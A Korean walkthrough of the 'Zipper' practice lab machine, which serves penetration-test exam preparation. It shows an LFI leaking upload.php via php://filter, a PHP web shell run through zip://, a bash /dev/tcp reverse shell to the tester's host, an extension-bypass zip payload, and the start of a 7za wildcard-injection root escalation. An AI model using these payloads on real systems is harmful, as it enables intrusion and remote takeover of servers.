---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/lfi-rfi
  - tech/lin/wildcard
  - tech/lin/cron
  - tech/cred/reuse
type: machine
platform: pg
os: linux
ip: 192.168.164.229
ports: [22, 80]
services: [http, ssh]
status: solved
manual_tags: true
tech_count: 4
---

> [!info] PG Practice — Pentest Advanced
> **타겟** 192.168.164.229 (재시작 후 192.168.103.229) · **OS** Ubuntu 20.04 (`zipper`) · **난이도** Advanced · **플래그 2개**
> **경로 요약** 80 커스텀 PHP 업로드 사이트 → `index.php?file=`의 **LFI** → **`php://filter/convert.base64-encode`** 로 `upload.php` 소스 유출 → 업로드가 파일을 **zip으로 묶어 보관**한다는 사실 확인 → 웹셸을 업로드해 **`zip://<아카이브>#shell`** 로 실행 → `www-data` → root 크론의 `7za a ... *.zip` 에 **와일드카드 인젝션(`@` 리스트파일 + 심볼릭 링크)** → `backup.log`에 `/root/secret` 유출(`WildCardsGoingWild`) → `su -` → root

## 0. 이 박스에서 배우는 것

- **PHP 스트림 래퍼(stream wrapper)** — `php://filter` · `zip://` · `data://` · `phar://` 가 각각 무엇이고, **하나의 LFI를 어디까지 확장**시키는가
- **소스 유출과 RCE는 다른 래퍼로 한다** — 읽기는 `php://filter`, 실행은 `zip://`. 같은 `?file=` 파라미터에서 두 단계를 나눠 쓴다
- **"업로드는 되는데 실행이 안 되는" 상황을 LFI로 잇는 법** — 업로드 지점과 실행 지점이 분리된 박스의 전형
- **와일드카드 인젝션(wildcard injection)** — 셸의 글로브 확장 결과가 명령의 **인자 위치**에 들어갈 때, **파일명 자체가 옵션이 된다**
- **root에게 대신 읽게 시키는 발상** — 내가 못 읽는 파일을 root 프로세스가 읽어 **내가 읽을 수 있는 곳에 뱉게** 만든다
- **크론 기반 지연 실행** — 심어놓고 **최소 1주기를 기다린다**

> [!tip] 시험 출제 가능성 — **매우 높다. 두 기법 모두 OSCP 단골이다**
> **① LFI + 래퍼**: `?file=`·`?page=`·`?include=` 파라미터를 보면 반사적으로 `php://filter`부터 던진다. 소스가 나오면 그 안에 다음 단계가 전부 적혀 있다.
> **② 와일드카드 인젝션**: `sudo -l`이나 크론에서 `tar`·`7z`·`rsync`·`chown`·`chmod`가 **`*`와 함께** 나오면 그 자리에서 GTFOBins를 열어야 한다. [[Cockpit]]의 `sudo tar -czvf /tmp/backup.tar.gz *` 가 같은 계열이다.
> 변형 예상: `zip://` 대신 `phar://` 역직렬화, `7za` 대신 `tar --checkpoint-action`, 크론 대신 `sudo` 권한.

---

## 1. 정찰

### Nmap

포트가 **22와 80 둘뿐**이다. 공격면이 좁다는 것은 **웹 하나에 모든 것이 걸려 있다**는 뜻이므로, 웹 열거에 시간을 몰아준다.

```bash
┌──(kali㉿kali)-[~/PG/Zipper]
└─$ nnmap 192.168.164.229
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-13 11:53 +0900
Nmap scan report for 192.168.164.229
Host is up (0.087s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Zipper
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   86.53 ms 192.168.45.1
2   86.51 ms 192.168.45.254
3   86.67 ms 192.168.251.1
4   86.72 ms 192.168.164.229

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds
```

> [!note] 이 출력에서 읽을 것
> | 줄 | 의미 |
> |---|---|
> | `OpenSSH 8.2p1 Ubuntu 4ubuntu0.3` | **Ubuntu 20.04 focal**의 표준 패키지 버전. OS 판정의 **독립 근거 ①** |
> | `Apache httpd 2.4.41 ((Ubuntu))` | 역시 20.04 표준. **독립 근거 ②** — 두 근거가 일치하므로 OS는 20.04로 확정 |
> | `http-title: Zipper` | 제품명이 아니라 **커스텀 사이트 제목**. 알려진 CMS가 아니라는 첫 신호 → searchsploit이 아니라 **직접 열거**로 간다 |
> | `Running: MikroTik RouterOS 7.X` | **오탐이다.** nmap의 OS 지문은 커널 버전대만 보고 후보를 나열한다. 위의 패키지 버전 두 개가 훨씬 강한 근거다 |
>
> **웹 서버 버전이 배포판 표준 패키지와 정확히 일치하면 OS를 역산할 수 있다.** `2.4.41`=20.04, `2.4.29`=18.04, `2.4.52`=22.04. 시험장에서 경로 관례(`/var/www/html`)를 확정하는 데 그대로 쓰인다.

### Whatweb

```bash
┌──(kali㉿kali)-[~/PG/Zipper]
└─$ cat whatweb.txt
http://192.168.164.229 [200 OK] Apache[2.4.41], Bootstrap[4.0.0], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.164.229], Script, Title[Zipper]
```

**`Bootstrap[4.0.0]` 말고는 프레임워크 지문이 하나도 없다.** WordPress·Drupal·Joomla 같은 것이면 whatweb이 반드시 잡는다. 즉 **손으로 짠 PHP**이고, 그렇다면 취약점은 CVE가 아니라 **개발자가 짠 로직**에 있다. 방향이 정해진다 — **파라미터를 찾아 직접 만져본다.**

### feroxbuster

```bash
┌──(kali㉿kali)-[~/PG/Zipper]
└─$ feroxbuster -u http://192.168.164.229/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x html,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.164.229/
 🚩  In-Scope Url          │ 192.168.164.229
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      320c http://192.168.164.229/uploads => http://192.168.164.229/uploads/
200      GET       76l      225w     3151c http://192.168.164.229/index.php
200      GET        8l       26w      155c http://192.168.164.229/style.css
200      GET       76l      225w     3151c http://192.168.164.229/
200      GET        8l       26w      155c http://192.168.164.229/style
[####################] - 19m  1245795/1245795 0s      found:5       errors:39
[####################] - 18m   622887/622887  562/s   http://192.168.164.229/
[####################] - 19m   622887/622887  561/s   http://192.168.164.229/uploads/
```

> [!danger] 스캐너 함정 ① — **`-x php`를 안 붙였다**
> 확장자에 `html,txt`만 줬다. 그래서 `upload.php`처럼 **직접 링크되지 않은 PHP 파일이 목록에 안 나온다.** `index.php`가 잡힌 건 `/`의 링크에서 뽑힌 것(`Extract Links`)이지 사전 매칭이 아니다.
> **PHP 사이트를 만나면 `-x php,txt,bak,old,zip` 이 기본값이어야 한다.** 이 박스에서는 결국 LFI로 소스를 읽어 `upload.php`의 존재를 알았지만, 시험장에서라면 스캔 한 번을 더 돌리는 비용이 훨씬 싸다.

> [!danger] 스캐너 함정 ② — **19분짜리 스캔을 끝까지 기다리지 마라**
> `directory-list-lowercase-2.3-medium.txt`(62만 단어) × 확장자 2개 = 124만 요청, 19분이다.
> 시험이라면 `directory-list-2.3-small.txt`나 `raft-small-words.txt`로 **먼저 2분 스캔**을 돌리고, **그 결과로 손을 움직이는 동안** 큰 사전을 백그라운드에 돌린다. 이 박스의 정답(`uploads/`, `index.php`)은 어떤 작은 사전에서도 1분 안에 나온다.

### 손으로 본 화면

`/uploads/`가 **301로 존재**하고, 첫 페이지에 **파일 업로드 폼**이 있다. 이 두 개가 이 박스의 뼈대다.

![[Pasted image 20260713154219.png]]

![[Pasted image 20260713154253.png]]

> [!tip] 업로드 폼을 보면 반드시 확인하는 3가지
> 1. **어디에 저장되는가** — 응답·리다이렉트·다운로드 링크에 경로가 노출되는가
> 2. **이름이 유지되는가, 바뀌는가** — 바뀐다면 그 규칙이 예측 가능한가(시각·난수·해시)
> 3. **그 디렉터리에서 PHP가 실행되는가** — `.htaccess`나 nginx `location` 한 줄로 막혀 있는 경우가 대부분이다
>
> 이 박스는 **①은 노출, ②는 변경(예측 가능), ③은 차단**이다. ③ 때문에 정공법이 막히고, 그래서 **LFI가 실행 경로**가 된다.

---

## 2. 취약점 분석

### 2-1. 배경 지식 ① — LFI가 무엇인가

`include`·`require`·`include_once`·`require_once`에 **사용자 입력이 그대로 들어가면** LFI(Local File Inclusion)다.

```php
include($_GET['file'] . '.php');   // ← 이 박스의 index.php로 추정되는 형태
```

PHP의 `include`는 **파일을 읽어 그 자리에 붙여넣고 PHP로 해석**한다. 여기서 두 가지가 갈린다.

| 대상 | 결과 |
|---|---|
| `<?php` 태그가 든 파일 | **실행된다.** 소스는 안 보이고 실행 결과만 나온다 |
| 평문 파일(`/etc/passwd` 등) | 그대로 출력된다 |

> [!danger] LFI의 첫 번째 벽 — **소스를 include하면 소스가 안 보인다**
> `index.php?file=upload` 를 요청하면 `upload.php`가 **실행**되어 버린다. 업로드 폼 HTML만 나오고 **PHP 코드는 한 줄도 안 보인다.**
> 소스가 필요한데 실행돼 버리는 이 문제를 푸는 것이 **`php://filter`** 다.

> [!note] `[가정]` — `include($_GET['file'] . '.php')` 형태로 확장자가 뒤에 붙는다
> 원문에 `index.php` 소스는 없다. 그러나 성공한 페이로드 두 개가 **모두 확장자를 생략**한다:
> - `php://filter/convert.base64-encode/resource=upload` → 실제로 읽힌 것은 `upload.php`
> - `zip://uploads/upload_1783926987.zip#shell` → 실제로 실행된 것은 아카이브 안의 `shell.php`
>
> 두 경우 모두 `.php`가 뒤에 자동으로 붙어야 성립한다. 따라서 **확장자 append형 LFI**로 판단한다.
> **실전 판별법**: `?file=/etc/passwd` 가 실패하고 `?file=/etc/passwd%00`(PHP 5.3 이하) 이나 `?file=upload`(확장자 생략)가 성공하면 append형이다. append형이면 **`/etc/passwd` 류의 시스템 파일은 못 읽고, `.php` 파일만 읽힌다** — "LFI인데 passwd가 안 나온다"고 포기하지 말 것.

### 2-2. 배경 지식 ② — PHP 스트림 래퍼(stream wrapper)

PHP의 파일 함수(`include`·`file_get_contents`·`fopen`·`copy`…)는 **경로를 URL처럼 해석**한다. `scheme://` 접두사가 붙으면 실제 파일시스템이 아니라 **등록된 래퍼**가 그 요청을 처리한다. `php -r 'print_r(stream_get_wrappers());'` 로 목록을 볼 수 있다.

**이것이 LFI 하나를 여러 개의 서로 다른 취약점으로 바꾼다.**

| 래퍼 | 하는 일 | LFI에서의 용도 | `allow_url_include` 영향 |
|---|---|---|---|
| **`php://filter/...`** | 스트림을 읽으면서 **필터를 통과**시킨다(인코딩·변환) | **소스 코드 유출** ← 이 박스 1단계 | **받지 않음** (로컬 래퍼) |
| **`zip://<아카이브>#<내부경로>`** | zip **내부의 한 파일**을 스트림으로 연다 | **아카이브 안에 숨긴 웹셸 실행** ← 이 박스 2단계 | **받지 않음** |
| **`phar://<파일>/<내부경로>`** | phar 아카이브 내부 접근 + **메타데이터 자동 역직렬화** | 업로드 가능하면 **역직렬화 → RCE**. 확장자 무관(`.jpg`도 됨) | **받지 않음** |
| **`data://text/plain;base64,...`** | URL 안에 **데이터 자체**를 담는다 | 페이로드를 파일 없이 바로 include → RCE | **받음** (`Off`면 실패) |
| **`php://input`** | 요청 **본문(body)** 을 스트림으로 | POST 본문에 `<?php ...?>` 넣어 RCE | **받음** |
| **`expect://`** | 명령을 직접 실행 | 즉시 RCE — 단 **기본 미설치** | — |
| `compress.zlib://` · `compress.bzip2://` | 압축 파일 투명 해제 | gz/bz2 안의 파일 읽기 | **받지 않음** |

> [!danger] 이 표에서 시험장에 가져갈 한 줄
> **`allow_url_include=Off`는 `zip://`·`phar://`·`php://filter`를 막지 못한다.**
> 방어자가 `allow_url_fopen`/`allow_url_include`를 끄고 "RFI 막았다"고 안심하는 지점이 정확히 여기다. **파일을 업로드할 수 있는 LFI는 그 설정과 무관하게 RCE다.**

### 2-3. `php://filter/convert.base64-encode/resource=` — 왜 소스가 유출되는가

문법은 이렇게 읽는다:

```
php://filter / convert.base64-encode / resource=upload
└─ 래퍼 ─┘   └──── 적용할 필터 ────┘   └─ 원본 스트림 ─┘
```

동작 순서가 핵심이다:

1. `include`가 `php://filter` 스트림을 연다
2. 래퍼가 **원본(`upload.php`)을 읽는다**
3. 읽은 바이트를 **`convert.base64-encode` 필터에 통과**시킨다
4. `include`는 그 **base64 문자열**을 받는다

> [!note] 왜 실행되지 않는가 — 이 한 문장이 전부다
> base64로 인코딩된 결과에는 **`<?php` 라는 바이트 시퀀스가 존재하지 않는다.**
> PHP 파서는 `<?php`를 만나야 코드 모드로 들어간다. 인코딩된 텍스트에는 그 여는 태그가 없으니 **파서는 전부를 HTML 텍스트로 간주해 그대로 출력**한다.
> 즉 "PHP가 인코딩해서 뱉는다" = **실행 트리거를 인코딩으로 파괴한 것**이다. `rot13`(`string.rot13`)이나 `convert.iconv.utf-8.utf-16`도 같은 이유로 동작한다.

원문에서 실제로 던진 URL:

```
http://192.168.164.229/index.php?file=php://filter/convert.base64-encode/resource=upload
```

![[Pasted image 20260713160249.png]]

> [!tip] 반사적으로 치는 순서 — `?file=` 을 보면 3연발
> ```bash
> curl -s 'http://T/index.php?file=php://filter/convert.base64-encode/resource=index' | base64 -d
> curl -s 'http://T/index.php?file=php://filter/convert.base64-encode/resource=upload' | base64 -d
> curl -s 'http://T/index.php?file=php://filter/convert.base64-encode/resource=config' | base64 -d
> ```
> **`index` → 그 안에서 include하는 다른 파일 → `config`/`db`/`settings`** 순으로 확장한다. `config`류에 DB 자격증명이 있으면 그게 곧 다음 단계다.
> 응답이 base64처럼 보이면 성공이다. `base64 -d` 로 바로 파이프해라 — 눈으로 판별하지 말고 디코드해서 확인한다.

> [!tip] 심화 — 필터 체인만으로 RCE (`php://filter` chain)
> `convert.iconv.*` 필터를 수십 개 연쇄하면 **원본 내용과 무관하게 임의의 바이트열을 만들어낼 수 있다**(Charles Fol, 2023). 업로드가 전혀 없어도 LFI 하나로 RCE가 된다.
> 시험 범위 밖일 가능성이 높지만, **"업로드 지점이 없는 LFI"** 에 부딪혔을 때 존재를 아는 것만으로 판단이 달라진다. 9장 링크 참조.

### 2-4. 왜 취약한가 — `upload.php` 원문

유출된 소스가 이 박스의 설계도다.

```php
<?php
if ($_FILES && $_FILES['img']) {

    if (!empty($_FILES['img']['name'][0])) {

        $zip = new ZipArchive();
        $zip_name = getcwd() . "/uploads/upload_" . time() . ".zip";

        // Create a zip target
        if ($zip->open($zip_name, ZipArchive::CREATE) !== TRUE) {
            $error .= "Sorry ZIP creation is not working currently.<br/>";
        }

        $imageCount = count($_FILES['img']['name']);
        for($i=0;$i<$imageCount;$i++) {

            if ($_FILES['img']['tmp_name'][$i] == '') {
                continue;
            }
            $newname = date('YmdHis', time()) . mt_rand() . '.tmp';

            // Moving files to zip.
            $zip->addFromString($_FILES['img']['name'][$i], file_get_contents($_FILES['img']['tmp_name'][$i]));

            // moving files to the target folder.
            move_uploaded_file($_FILES['img']['tmp_name'][$i], './uploads/' . $newname);
        }
        $zip->close();

        // Create HTML Link option to download zip
        $success = basename($zip_name);
    } else {
        $error = '<strong>Error!! </strong> Please select a file.';
    }
}
```

한 줄씩 결함을 뽑아낸다.

| 코드 | 무엇이 문제인가 |
|---|---|
| **검증이 하나도 없다** | 확장자·MIME·매직바이트·크기 — **아무것도 확인하지 않는다.** `img`라는 이름과 달리 무엇이든 받는다 |
| `$zip_name = getcwd() . "/uploads/upload_" . time() . ".zip"` | 파일명이 **유닉스 시각 초 단위**다. **완전히 예측 가능**하다 |
| `$zip->addFromString($_FILES['img']['name'][$i], ...)` | **zip 내부의 엔트리 이름 = 사용자가 보낸 원본 파일명.** 여기서 `shell.php`라는 이름이 아카이브 안에 그대로 살아남는다 ← **이 박스의 급소** |
| `move_uploaded_file(..., './uploads/' . $newname)` | 디스크에 떨어지는 사본은 `<날짜><난수>.tmp`로 **개명**된다 → `.tmp`는 PHP로 실행되지 않는다 |
| `$success = basename($zip_name)` | 생성된 zip 이름을 **응답 화면에 알려준다** → 시각을 추측할 필요조차 없다 |

> [!danger] 여기가 함정이다 — **개명은 zip 밖에서만 일어난다**
> 개발자의 방어 의도는 명확하다: 업로드된 파일을 `.tmp`로 바꿔 실행을 막는다.
> 그런데 **zip 안에 들어가는 이름은 개명되지 않는다.** `addFromString`의 첫 인자가 원본 파일명 그대로다.
> 즉 **`uploads/upload_<시각>.zip` 안에는 `shell.php`가 원래 이름으로 보존**되어 있다. 개명 방어가 아카이브 내부에는 적용되지 않는 것 — 이것이 취약점의 본체다.

> [!note] `[가정]` — `/uploads/.htaccess`(32바이트)의 역할
> 나중에 셸을 잡고 `ls -al`을 찍었을 때 `uploads/`에 32바이트짜리 `.htaccess`가 있었다. 내용은 원문에 기록되지 않았다.
> 32바이트면 `php_flag engine off` 나 `RemoveHandler .php` 한 줄 정도의 크기다. **업로드 디렉터리에서 PHP 실행을 끄는 전형적 방어**로 보인다.
> 그래서 `.php`를 직접 업로드해 `/uploads/x.php`로 접근하는 정공법은 애초에 통하지 않는다. **실행은 반드시 LFI를 통해야 한다.**

### 2-5. `zip://` 래퍼 — 아카이브 내부 파일을 읽는 원리

문법:

```
zip://<아카이브 경로>#<아카이브 내부 엔트리 경로>
```

- `#` 앞은 **디스크 상의 zip 파일**, 뒤는 **그 zip 안의 엔트리 이름**이다
- 래퍼가 zip 중앙 디렉터리를 파싱해 해당 엔트리를 찾고 **압축을 풀어 스트림으로 돌려준다**
- `include`가 이 스트림을 받으면 **압축 해제된 내용이 PHP 코드로 해석**된다

> [!danger] LFI → RCE 전환의 필요조건 4가지
> 1. **내가 내용을 통제하는 파일이 서버 디스크에 존재**해야 한다 — 업로드 기능, 로그 포이즈닝, 세션 파일 중 하나
> 2. 그 파일의 **경로를 알아야** 한다 (이 박스는 응답에 알려준다)
> 3. 파일이 **zip 형식**이어야 하고, **내부 엔트리 이름을 알아야** 한다 (이 박스는 내가 정한 업로드 파일명 그대로)
> 4. PHP에 **`zip` 확장이 활성**돼 있어야 한다 (`ZipArchive`를 쓰는 사이트이므로 자동 충족)
>
> **"업로드가 zip으로 묶인다"는 사실 자체가 곧 익스플로잇 조건**이라는 점이 이 박스의 설계 의도다. 업로드 기능이 zip/tar를 만들면 `zip://`·`phar://`를 즉시 떠올려라.

> [!tip] 업로드가 zip을 안 만들어도 쓸 수 있다
> **아무 파일이나 업로드되면**, 내가 로컬에서 만든 zip을 `.jpg` 확장자로 올려도 된다. zip 래퍼는 **확장자를 보지 않고 내용(매직 `PK\x03\x04`)만 본다**:
> ```bash
> echo '<?php system($_GET["c"]); ?>' > shell.php
> zip payload.zip shell.php
> mv payload.zip payload.jpg          # 확장자 필터 우회
> # 업로드 후: ?file=zip://uploads/payload.jpg%23shell
> ```
> `phar://`도 동일하다. **확장자 화이트리스트는 래퍼 공격을 막지 못한다.**

### 2-6. 왜 이 페이로드인가 — 조각 해설

```
index.php?file=zip://uploads/upload_1783926987.zip%23shell&c=id
```

| 조각 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `file=` | LFI 파라미터 | — |
| `zip://` | 스트림 래퍼 지정 | 없으면 `uploads/upload_...zip.php`라는 없는 파일을 찾다 실패 |
| `uploads/upload_1783926987.zip` | **상대 경로**. `index.php`가 있는 웹루트 기준 | 절대경로 `/var/www/html/uploads/...`도 동작한다 |
| **`%23`** | `#`의 URL 인코딩 | **인코딩하지 않으면 브라우저·curl이 `#` 뒤를 프래그먼트로 보고 서버에 안 보낸다.** 서버는 `zip://uploads/....zip` 만 받고 실패 ← **가장 흔한 실수** |
| `shell` | zip 내부 엔트리 `shell.php`에서 **`.php`를 뺀 것** (LFI가 붙여준다) | `shell.php`라고 쓰면 `shell.php.php`를 찾다 실패 |
| `&c=id` | 웹셸 `system($_GET["c"])`이 읽을 명령 | 웹셸은 실행되지만 아무 일도 안 일어남 |

> [!danger] `%23` — 이 한 글자가 이 박스의 진짜 관문이다
> `#`는 **URL 프래그먼트 구분자**다. 클라이언트가 잘라먹고 서버로 보내지 않는다.
> 브라우저 주소창·Burp Repeater·`curl`의 URL 인자 어디에서든 **반드시 `%23`으로 써야 한다.**
> `curl`을 쓴다면 아예 `--data-urlencode`에 맡기는 것이 안전하다 — 원문에서도 리버스셸 단계에서는 이 방식을 썼다.

---

## 3. Foothold — zip 안의 웹셸을 LFI로 실행

### 3-1. 웹셸 제작

```bash
┌──(kali㉿kali)-[~/PG/Zipper]
└─$ echo '<?php system($_GET["c"]); ?>' > shell.php

```

**파일명이 `shell.php`인 것이 중요하다.** 이 이름이 `addFromString`을 통해 **zip 엔트리 이름으로 그대로 들어가고**, 그것이 곧 `zip://...#shell`의 `shell`이 된다.

이 상태로 업로드 폼(`img` 필드)에 올린다. 응답 화면이 생성된 아카이브 이름(`$success = basename($zip_name)`)을 알려주므로 **시각을 추측할 필요가 없다.**

> [!tip] 응답에 이름이 안 나온다면 — `time()` 예측
> `time()`은 유닉스 초다. 업로드 시각을 알면 후보는 **±5초, 즉 11개**뿐이다:
> ```bash
> for t in $(seq $(( $(date +%s) - 5 )) $(( $(date +%s) + 5 ))); do
>   curl -s -o /dev/null -w "$t %{http_code}\n" "http://T/uploads/upload_$t.zip"
> done
> ```
> **서버와 칼리의 시각이 어긋날 수 있으므로** 응답의 `Date:` 헤더를 기준으로 잡아라. 이것이 "예측 가능한 파일명"을 실전에서 터는 표준 절차다.

### 3-2. 웹셸 동작 확인

```python
http://192.168.164.229/index.php?file=zip://uploads/upload_1783926987.zip%23shell&c=id
```

`upload_1783926987.zip` 안의 웹셸이 실행된다.

![[Pasted image 20260713161854.png]]

> [!note] 왜 `id`부터 던지는가
> 리버스셸을 바로 시도하면 **실패했을 때 원인이 3중으로 갈린다**(웹셸이 안 됨 / 명령이 안 됨 / 아웃바운드가 막힘).
> `c=id` 한 방으로 **"웹셸이 살아 있고 명령이 실행된다"** 를 먼저 확정하면, 다음 단계 실패는 네트워크 문제로 좁혀진다. **한 번에 한 변수만 바꾼다.**

### 3-3. 리버스셸

> [!note] 타겟 IP가 바뀐 지점
> 여기서부터 IP가 `192.168.164.229` → `192.168.103.229`, 아카이브도 `upload_1783926987.zip` → `upload_1783991346.zip`으로 바뀐다.
> **[가정]** 랩 인스턴스를 stop/revert 했다가 다시 띄워 IP가 재할당됐고, 그 과정에서 업로드가 소멸해 **웹셸을 다시 올렸기 때문**이다(6장 ① 참조). 원문 값을 그대로 보존한다.

```bash
┌──(kali㉿kali)-[~/PG/Zipper]
└─$ curl -G "http://192.168.103.229/index.php" \
  --data-urlencode "file=zip://uploads/upload_1783991346.zip#shell" \
  --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/192.168.45.244/4444 0>&1'"


┌──(kali㉿kali)-[~/PG/Zipper]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.103.229] 48642
bash: cannot set terminal process group (962): Inappropriate ioctl for device
bash: no job control in this shell
www-data@zipper:/var/www/html$ whoami
whoami
www-data
```

> [!note] 명령 플래그 해설
> | 플래그 | 역할 | 빼면 |
> |---|---|---|
> | `curl -G` | `--data-urlencode`로 만든 데이터를 **본문이 아니라 쿼리스트링**으로 보낸다 | POST가 되어 `$_GET`이 비고 웹셸이 아무 것도 실행하지 않는다 ← **`-G`가 핵심** |
> | `--data-urlencode "file=...#shell"` | `#`·`/`·공백을 **curl이 알아서 인코딩** | `#` 뒤가 잘려 zip 엔트리 지정이 사라진다 |
> | `--data-urlencode "c=bash -c '...'"` | 공백·`>`·`&`·`/`가 잔뜩인 페이로드를 안전하게 전달 | 셸/HTTP 어느 층에서든 깨진다 |
> | `bash -c '...'` | `>&`·`0>&1`은 **bash 문법**이다. `system()`은 `/bin/sh`(dash)로 실행하므로 감싸주지 않으면 실패 | dash에서 `>&` 문법 오류 → 셸이 안 붙는다 ← **원인 파악이 가장 어려운 실패** |
> | `rlwrap` | 방향키·히스토리·백스페이스가 동작 | 오타 수정이 안 돼 작업 속도가 절반이 된다 |
> | `nc -lnvp 4444` | `-l` 리슨 · `-n` DNS 조회 안 함 · `-v` 연결 로그 · `-p` 포트 | `-n`을 빼면 역방향 DNS 대기로 표시가 늦다 |

![[Pasted image 20260714103424.png]]
![[Pasted image 20260714103437.png]]

브라우저/프록시로 같은 요청을 보낸 형태(포트 4443). **`%23`과 페이로드 전체가 URL 인코딩된 모습**을 확인할 수 있다 — 손으로 인코딩할 때의 정답 형태다.

```python
GET /index.php?file=zip://uploads/upload_1783991346.zip%23shell&c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.244%2F4443%200%3E%261%27 HTTP/1.1
Host: 192.168.103.229
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive

```

![[Pasted image 20260714104154.png]]

> [!tip] 인코딩 대조표 — 손으로 넣어야 할 때
> `#`→`%23` · 공백→`%20` · `'`→`%27` · `>`→`%3E` · `&`→`%26` · `/`→`%2F`
> **`&`를 인코딩하지 않으면 `c=` 파라미터가 거기서 끊긴다.** 리버스셸 문자열의 `>&`와 `0>&1`이 정확히 이 함정에 걸린다.

### 3-4. TTY 업그레이드

`no job control in this shell` 상태에서는 `su`가 동작하지 않는다. **권한상승 마지막 단계에서 `su -`를 써야 하므로** 여기서 반드시 정리한다.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 없으면
script -qc /bin/bash /dev/null
# 그 뒤 (Ctrl+Z → 로컬에서)
stty raw -echo; fg
export TERM=xterm
```

> [!danger] `su`는 **진짜 TTY가 없으면 거부한다**
> `su: must be run from a terminal`. 이 박스의 마지막 단계가 `su -`이므로, TTY 업그레이드를 건너뛰면 **비밀번호를 손에 쥐고도 root가 안 된다.**
> 대안: `echo 'WildCardsGoingWild' | su -` 는 **동작하지 않는다**(su는 stdin이 아니라 TTY에서 읽는다). `sshpass`로 22번에 로그인하거나 TTY를 확보하는 것이 정답이다.

---

## 4. 권한상승 — 7z 와일드카드 인젝션

### 4-1. 셸을 잡자마자 치는 5개

```bash
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*; crontab -l
```

이 박스의 정답은 **다섯 번째 줄**에 있다. linpeas로도 같은 것을 잡았다.

![[Pasted image 20260714114748.png]]

> [!warning] linpeas는 시험에서 **허용**이지만 맹신하지 마라
> linPEAS·pspy는 자동 익스플로잇 도구가 아니라 **열거 스크립트**이므로 OSCP에서 금지가 아니다.
> 다만 ① 출력이 수천 줄이라 놓치기 쉽고 ② **크론 항목은 `/etc/crontab`과 `/etc/cron.d/`를 직접 `cat` 하는 것이 확실하다.**
> **수동 대안**: 크론을 못 찾겠으면 `pspy64`로 프로세스 생성을 실시간 감시한다 — 크론 항목이 root 전용 위치에 숨어 있어 읽을 수 없을 때 유일한 방법이다.

### 4-2. `backup.sh` — 결함이 한 줄에 다 들어 있다

```bash
www-data@zipper:/opt$ cat backup.sh
cat backup.sh
#!/bin/bash
password=`cat /root/secret`
cd /var/www/html/uploads
rm *.tmp
7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.logwww-data@zipper:/opt$
```

![[Pasted image 20260714114834.png]]

줄 단위로 분해한다.

| 줄 | 읽는 법 |
|---|---|
| `password=`cat /root/secret`` | **root만 읽을 수 있는 파일**을 읽어 변수에 담는다 → 이 스크립트는 **root로 실행된다**는 증거 |
| `cd /var/www/html/uploads` | 작업 디렉터리가 **www-data가 쓰기 가능한 곳** ← 여기서 게임이 끝난다 |
| `rm *.tmp` | 업로드 사본 청소. **글로브 ①** |
| `7za a ... *.zip` | **글로브 ②** — 이것이 공격 지점 |
| `-p$password` | 비밀번호를 **명령행 인자로** 넘긴다 → `ps`에 노출된다 (4-6의 대안 경로) |
